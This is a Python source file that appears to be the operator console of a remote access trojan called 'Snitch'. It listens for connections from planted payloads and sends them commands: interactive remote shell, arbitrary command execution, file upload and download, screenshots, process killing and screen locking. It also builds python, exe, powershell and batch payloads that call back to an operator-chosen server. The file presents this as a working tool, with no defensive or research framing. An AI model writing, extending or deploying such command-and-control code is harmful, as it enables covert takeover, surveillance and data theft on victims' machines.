"""
Command handling and server logic for Snitch application.
"""
from __future__ import annotations

import json
import logging
import os
import platform
import time
from pathlib import Path
from typing import Any, Optional

from .Snitch_help import (
    print_error, print_help, print_info, print_key_help, 
    print_payload_help, print_success, print_warning
)
from .Snitch_lib import server
from .Snitch_utils import crypto, validate_ip, validate_port
from .Snitch_Vars.globals import DEFAULT_PORT, DOWNLOADS_DIR, UPLOADS_DIR

logger = logging.getLogger(__name__)


class SnitchCommandHandler:
    """Handles all Snitch commands and operations."""
    
    def __init__(self):
        self.current_directory = Path.cwd()
        self.connection_history: list[dict[str, Any]] = []
    
    def handle_command(self, command_line: str) -> bool:
        """Handle a command line input. Returns False to exit."""
        if not command_line.strip():
            return True
        
        parts = command_line.strip().split()
        command = parts[0].lower()
        args = parts[1:] if len(parts) > 1 else []
        
        # Command routing
        command_map = {
            'help': self._cmd_help,
            'listen': self._cmd_listen,
            'stop': self._cmd_stop,
            'status': self._cmd_status,
            'connect': self._cmd_connect,
            'sessions': self._cmd_sessions,
            'disconnect': self._cmd_disconnect,
            'history': self._cmd_history,
            'shell': self._cmd_shell,
            'cmd': self._cmd_execute,
            'sysinfo': self._cmd_sysinfo,
            'upload': self._cmd_upload,
            'download': self._cmd_download,
            'ls': self._cmd_ls,
            'dir': self._cmd_ls,  # Windows alias
            'pwd': self._cmd_pwd,
            'cd': self._cmd_cd,
            'screenshot': self._cmd_screenshot,
            'processes': self._cmd_processes,
            'kill': self._cmd_kill,
            'lock': self._cmd_lock,
            'showkey': self._cmd_showkey,
            'addkey': self._cmd_addkey,
            'listkeys': self._cmd_listkeys,
            'genkey': self._cmd_genkey,
            'generate': self._cmd_generate,
            'payloads': self._cmd_payloads,
            'clear': self._cmd_clear,
            'exit': self._cmd_exit,
            'quit': self._cmd_exit,
        }
        
        if command in command_map:
            try:
                return command_map[command](args)
            except Exception as e:
                print_error(f"Command failed: {e}")
                logger.error(f"Command '{command}' failed: {e}")
                return True
        else:
            print_error(f"Unknown command: {command}")
            print_info("Type 'help' for available commands")
            return True
    
    def _cmd_help(self, args: list[str]) -> bool:
        """Show help information."""
        if args and args[0].lower() == 'keys':
            print_key_help()
        elif args and args[0].lower() == 'payloads':
            print_payload_help()
        else:
            print_help()
        return True
    
    def _cmd_listen(self, args: list[str]) -> bool:
        """Start server on specified port."""
        port = DEFAULT_PORT
        
        if args:
            if not validate_port(args[0]):
                print_error("Invalid port number")
                return True
            port = int(args[0])
        
        if server.running:
            print_warning(f"Server already running on port {server.port}")
            return True
        
        if server.start_server(port):
            print_success(f"Server started on port {port}")
            print_info("Waiting for connections...")
        else:
            print_error("Failed to start server")
        
        return True
    
    def _cmd_stop(self, args: list[str]) -> bool:
        """Stop the server."""
        if not server.running:
            print_warning("Server is not running")
            return True
        
        server.stop_server()
        print_success("Server stopped")
        return True
    
    def _cmd_status(self, args: list[str]) -> bool:
        """Show server status."""
        if server.running:
            connections = server.get_active_connections()
            print_info(f"Server running on port {server.port}")
            print_info(f"Active connections: {len(connections)}")
            
            if connections:
                print("\nActive Connections:")
                for conn in connections:
                    print(f"  {conn['ip']}:{conn['port']} - Last seen: {time.ctime(conn['last_seen'])}")
        else:
            print_info("Server is not running")
        
        return True
    
    def _cmd_connect(self, args: list[str]) -> bool:
        """Connect to remote payload."""
        if len(args) < 2:
            print_error("Usage: connect <ip> <port>")
            return True
        
        ip, port_str = args[0], args[1]
        
        if not validate_ip(ip):
            print_error("Invalid IP address")
            return True
        
        if not validate_port(port_str):
            print_error("Invalid port number")
            return True
        
        port = int(port_str)
        
        print_info(f"Connecting to {ip}:{port}...")
        
        # TODO: Implement client connection
        print_warning("Client connection not yet implemented")
        
        return True
    
    def _cmd_sessions(self, args: list[str]) -> bool:
        """Show active client connections."""
        connections = server.get_active_connections()
        
        if not connections:
            print_info("No active connections")
            return True
        
        print(f"\nActive Sessions ({len(connections)}):")
        print("-" * 60)
        
        for i, conn in enumerate(connections, 1):
            duration = time.time() - conn['last_seen']
            print(f"{i:2d}. {conn['ip']}:{conn['port']} - Duration: {duration:.0f}s")
        
        return True
    
    def _cmd_disconnect(self, args: list[str]) -> bool:
        """Disconnect specific client."""
        if not args:
            print_error("Usage: disconnect <ip>")
            return True
        
        ip = args[0]
        connection = server.get_connection(ip)
        
        if not connection:
            print_error(f"No connection found for {ip}")
            return True
        
        connection.close()
        print_success(f"Disconnected from {ip}")
        
        return True
    
    def _cmd_history(self, args: list[str]) -> bool:
        """Show connection history."""
        if not self.connection_history:
            print_info("No connection history")
            return True
        
        print("\nConnection History:")
        print("-" * 60)
        
        for i, entry in enumerate(self.connection_history[-10:], 1):  # Last 10
            print(f"{i:2d}. {entry['ip']}:{entry['port']} - {time.ctime(entry['timestamp'])}")
        
        return True
    
    def _cmd_shell(self, args: list[str]) -> bool:
        """Interactive shell with specific client."""
        if not args:
            print_error("Usage: shell <ip>")
            return True
        
        ip = args[0]
        connection = server.get_connection(ip)
        
        if not connection:
            print_error(f"No connection found for {ip}")
            return True
        
        print_info(f"Starting interactive shell with {ip}")
        print_info("Type 'exit' to return to main console")
        
        while True:
            try:
                command = input(f"{ip}> ").strip()
                
                if command.lower() in ['exit', 'quit']:
                    break
                
                if not command:
                    continue
                
                # Send command to client
                response = server.send_command(ip, "shell", {"command": command})
                
                if response:
                    if response.get("success"):
                        output = response.get("output", "")
                        if output:
                            print(output)
                    else:
                        print_error(response.get("error", "Command failed"))
                else:
                    print_error("No response from client")
                    break
                    
            except KeyboardInterrupt:
                print("\nExiting shell...")
                break
            except EOFError:
                break
        
        return True
    
    def _cmd_execute(self, args: list[str]) -> bool:
        """Execute single command on client."""
        if len(args) < 2:
            print_error("Usage: cmd <ip> <command>")
            return True
        
        ip = args[0]
        command = " ".join(args[1:])
        
        connection = server.get_connection(ip)
        if not connection:
            print_error(f"No connection found for {ip}")
            return True
        
        response = server.send_command(ip, "execute", {"command": command})
        
        if response:
            if response.get("success"):
                output = response.get("output", "")
                if output:
                    print(output)
            else:
                print_error(response.get("error", "Command failed"))
        else:
            print_error("No response from client")
        
        return True
    
    def _cmd_sysinfo(self, args: list[str]) -> bool:
        """Get system information from client."""
        if not args:
            print_error("Usage: sysinfo <ip>")
            return True
        
        ip = args[0]
        connection = server.get_connection(ip)
        
        if not connection:
            print_error(f"No connection found for {ip}")
            return True
        
        response = server.send_command(ip, "sysinfo")
        
        if response and response.get("success"):
            info = response.get("data", {})
            
            print(f"\nSystem Information for {ip}:")
            print("-" * 40)
            print(f"OS: {info.get('os', 'Unknown')}")
            print(f"Platform: {info.get('platform', 'Unknown')}")
            print(f"Hostname: {info.get('hostname', 'Unknown')}")
            print(f"User: {info.get('user', 'Unknown')}")
            print(f"Architecture: {info.get('architecture', 'Unknown')}")
            print(f"Python Version: {info.get('python_version', 'Unknown')}")
        else:
            print_error("Failed to get system information")
        
        return True
    
    def _cmd_upload(self, args: list[str]) -> bool:
        """Upload file to client."""
        if len(args) < 3:
            print_error("Usage: upload <ip> <local_file> <remote_path>")
            return True
        
        ip, local_file, remote_path = args[0], args[1], args[2]
        
        connection = server.get_connection(ip)
        if not connection:
            print_error(f"No connection found for {ip}")
            return True
        
        local_path = Path(local_file)
        if not local_path.exists():
            print_error(f"Local file not found: {local_file}")
            return True
        
        try:
            with open(local_path, 'rb') as f:
                file_data = f.read()
            
            # Convert to base64 for JSON transmission
            import base64
            file_b64 = base64.b64encode(file_data).decode('ascii')
            
            response = server.send_command(ip, "upload", {
                "path": remote_path,
                "data": file_b64,
                "size": len(file_data)
            })
            
            if response and response.get("success"):
                print_success(f"File uploaded to {remote_path}")
            else:
                print_error(response.get("error", "Upload failed"))
                
        except Exception as e:
            print_error(f"Upload failed: {e}")
        
        return True
    
    def _cmd_download(self, args: list[str]) -> bool:
        """Download file from client."""
        if len(args) < 2:
            print_error("Usage: download <ip> <remote_file> [local_path]")
            return True
        
        ip, remote_file = args[0], args[1]
        local_path = args[2] if len(args) > 2 else Path(remote_file).name
        
        connection = server.get_connection(ip)
        if not connection:
            print_error(f"No connection found for {ip}")
            return True
        
        response = server.send_command(ip, "download", {"path": remote_file})
        
        if response and response.get("success"):
            try:
                import base64
                file_data = base64.b64decode(response["data"])
                
                download_path = DOWNLOADS_DIR / local_path
                download_path.parent.mkdir(parents=True, exist_ok=True)
                
                with open(download_path, 'wb') as f:
                    f.write(file_data)
                
                print_success(f"File downloaded to {download_path}")
                
            except Exception as e:
                print_error(f"Download failed: {e}")
        else:
            print_error(response.get("error", "Download failed"))
        
        return True
    
    def _cmd_ls(self, args: list[str]) -> bool:
        """List directory contents on client."""
        if not args:
            print_error("Usage: ls <ip> [path]")
            return True
        
        ip = args[0]
        path = args[1] if len(args) > 1 else "."
        
        connection = server.get_connection(ip)
        if not connection:
            print_error(f"No connection found for {ip}")
            return True
        
        response = server.send_command(ip, "listdir", {"path": path})
        
        if response and response.get("success"):
            files = response.get("files", [])
            
            print(f"\nDirectory listing for {path}:")
            print("-" * 60)
            
            for file_info in files:
                file_type = "DIR" if file_info.get("is_dir") else "FILE"
                size = file_info.get("size", 0)
                name = file_info.get("name", "")
                
                print(f"{file_type:4s} {size:>10d} {name}")
        else:
            print_error(response.get("error", "Failed to list directory"))
        
        return True
    
    def _cmd_pwd(self, args: list[str]) -> bool:
        """Show current directory on client."""
        if not args:
            print_error("Usage: pwd <ip>")
            return True
        
        ip = args[0]
        connection = server.get_connection(ip)
        
        if not connection:
            print_error(f"No connection found for {ip}")
            return True
        
        response = server.send_command(ip, "pwd")
        
        if response and response.get("success"):
            print(f"Current directory: {response.get('path', 'Unknown')}")
        else:
            print_error("Failed to get current directory")
        
        return True
    
    def _cmd_cd(self, args: list[str]) -> bool:
        """Change directory on client."""
        if len(args) < 2:
            print_error("Usage: cd <ip> <path>")
            return True
        
        ip, path = args[0], args[1]
        connection = server.get_connection(ip)
        
        if not connection:
            print_error(f"No connection found for {ip}")
            return True
        
        response = server.send_command(ip, "chdir", {"path": path})
        
        if response and response.get("success"):
            print_success(f"Changed directory to: {response.get('path', path)}")
        else:
            print_error(response.get("error", "Failed to change directory"))
        
        return True
    
    def _cmd_screenshot(self, args: list[str]) -> bool:
        """Take screenshot from client."""
        if not args:
            print_error("Usage: screenshot <ip>")
            return True
        
        ip = args[0]
        connection = server.get_connection(ip)
        
        if not connection:
            print_error(f"No connection found for {ip}")
            return True
        
        print_info("Taking screenshot...")
        response = server.send_command(ip, "screenshot")
        
        if response and response.get("success"):
            try:
                import base64
                screenshot_data = base64.b64decode(response["data"])
                
                timestamp = int(time.time())
                filename = f"screenshot_{ip}_{timestamp}.png"
                screenshot_path = DOWNLOADS_DIR / filename
                
                with open(screenshot_path, 'wb') as f:
                    f.write(screenshot_data)
                
                print_success(f"Screenshot saved to {screenshot_path}")
                
            except Exception as e:
                print_error(f"Failed to save screenshot: {e}")
        else:
            print_error(response.get("error", "Screenshot failed"))
        
        return True
    
    def _cmd_processes(self, args: list[str]) -> bool:
        """List running processes on client."""
        if not args:
            print_error("Usage: processes <ip>")
            return True
        
        ip = args[0]
        connection = server.get_connection(ip)
        
        if not connection:
            print_error(f"No connection found for {ip}")
            return True
        
        response = server.send_command(ip, "processes")
        
        if response and response.get("success"):
            processes = response.get("processes", [])
            
            print(f"\nRunning Processes on {ip}:")
            print("-" * 80)
            print(f"{'PID':>8s} {'Name':30s} {'Memory':>10s}")
            print("-" * 80)
            
            for proc in processes[:20]:  # Limit to first 20
                pid = proc.get("pid", 0)
                name = proc.get("name", "Unknown")[:29]
                memory = proc.get("memory", 0)
                
                print(f"{pid:>8d} {name:30s} {memory:>10.1f}MB")
        else:
            print_error(response.get("error", "Failed to get processes"))
        
        return True
    
    def _cmd_kill(self, args: list[str]) -> bool:
        """Kill process on client."""
        if len(args) < 2:
            print_error("Usage: kill <ip> <pid>")
            return True
        
        ip, pid_str = args[0], args[1]
        
        try:
            pid = int(pid_str)
        except ValueError:
            print_error("Invalid PID")
            return True
        
        connection = server.get_connection(ip)
        if not connection:
            print_error(f"No connection found for {ip}")
            return True
        
        response = server.send_command(ip, "kill", {"pid": pid})
        
        if response and response.get("success"):
            print_success(f"Process {pid} killed")
        else:
            print_error(response.get("error", "Failed to kill process"))
        
        return True
    
    def _cmd_lock(self, args: list[str]) -> bool:
        """Lock client screen."""
        if not args:
            print_error("Usage: lock <ip>")
            return True
        
        ip = args[0]
        connection = server.get_connection(ip)
        
        if not connection:
            print_error(f"No connection found for {ip}")
            return True
        
        response = server.send_command(ip, "lock")
        
        if response and response.get("success"):
            print_success(f"Screen locked on {ip}")
        else:
            print_error(response.get("error", "Failed to lock screen"))
        
        return True
    
    def _cmd_showkey(self, args: list[str]) -> bool:
        """Display current AES encryption key."""
        key_info = crypto.get_current_key_info()
        
        if "error" in key_info:
            print_error(key_info["error"])
            return True
        
        print("\nCurrent AES Key Information:")
        print("-" * 50)
        print(f"Key (Base64): {key_info['key_encoded']}")
        print(f"Abbreviation: {key_info['key_abbrev']}")
        print(f"Key Length: {key_info['key_length']} bytes")
        print(f"Library Keys: {key_info['library_keys']}")
        
        return True
    
    def _cmd_addkey(self, args: list[str]) -> bool:
        """Add AES key to library."""
        if not args:
            print_error("Usage: addkey <base64_key>")
            return True
        
        key_encoded = args[0]
        
        if crypto.add_key_to_library(key_encoded):
            print_success("Key added to library")
        else:
            print_error("Failed to add key to library")
        
        return True
    
    def _cmd_listkeys(self, args: list[str]) -> bool:
        """Show all keys in library."""
        if not crypto.key_library:
            print_info("No keys in library")
            return True
        
        print("\nAES Key Library:")
        print("-" * 60)
        
        for i, (abbrev, key) in enumerate(crypto.key_library.items(), 1):
            print(f"{i:2d}. {abbrev} - {key[:20]}...")
        
        return True
    
    def _cmd_genkey(self, args: list[str]) -> bool:
        """Generate new random AES key."""
        import secrets
        import base64
        
        key_bytes = secrets.token_bytes(32)
        key_encoded = base64.b64encode(key_bytes).decode('ascii')
        
        print("\nGenerated AES Key:")
        print("-" * 50)
        print(f"Key (Base64): {key_encoded}")
        print(f"Key Length: 32 bytes")
        print("\nUse 'addkey' command to add this key to your library")
        
        return True
    
    def _cmd_generate(self, args: list[str]) -> bool:
        """Generate payload."""
        if len(args) < 3:
            print_error("Usage: generate <type> <server_ip> <server_port>")
            print_info("Available types: python, exe, powershell, batch")
            return True
        
        payload_type, server_ip, server_port = args[0], args[1], args[2]
        
        if not validate_ip(server_ip):
            print_error("Invalid server IP address")
            return True
        
        if not validate_port(server_port):
            print_error("Invalid server port")
            return True
        
        # Import payload generator
        from .Snitch_gen import payload_generator
        
        print_info(f"Generating {payload_type} payload for {server_ip}:{server_port}...")
        
        payload_path = payload_generator.generate_payload(payload_type, server_ip, int(server_port))
        
        if payload_path:
            print_success(f"Payload generated: {payload_path}")
        else:
            print_error("Failed to generate payload")
        
        return True
    
    def _cmd_payloads(self, args: list[str]) -> bool:
        """List available payload types."""
        print_payload_help()
        return True
    
    def _cmd_clear(self, args: list[str]) -> bool:
        """Clear screen."""
        os.system('cls' if os.name == 'nt' else 'clear')
        return True
    
    def _cmd_exit(self, args: list[str]) -> bool:
        """Exit Snitch application."""
        print_info("Shutting down Snitch...")
        
        if server.running:
            server.stop_server()
        
        print_success("Goodbye!")
        return False


# Global command handler instance
command_handler = SnitchCommandHandler()